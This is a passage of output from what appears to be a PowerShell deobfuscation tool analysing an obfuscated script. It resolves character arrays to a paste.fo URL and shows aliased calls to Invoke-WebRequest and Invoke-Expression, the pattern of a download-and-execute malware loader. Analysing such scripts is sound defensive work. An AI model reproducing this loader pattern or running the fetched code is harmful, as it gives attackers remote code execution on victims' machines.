56, 102, 54, 54, 48, 102, 99, 101, 98, 102, 17)
    [292-296] [Var] ${X}
      => INCONSISTENT: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32

Node 17 (AssignmentStatementAst):
  Code: $c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
    [332-337] [Alias] [D:0] input
      => Invoke-WebRequest
    [338-382] [Paren] [D:3] ([sySteM.tExt.EncOding]::UTF8.GetString($b))
      => 'https://paste.fo/raw/98f660fcebf4'
    [339-381] [MemberInvoke Member] [D:4] [sySteM.tExt.EncOding]::UTF8.GetString($b)
      => 'https://paste.fo/raw/98f660fcebf4'
    [378-380] [Var] $b
      => @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 98, 102, 52)

Node 18 (PipelineElement):
  Code: output $c
    [392-398] [Alias] [D:0] output
      => Invoke-Expression
    [399-401] [Var] $c
      => __BLOCKED_PLACEHOLDER__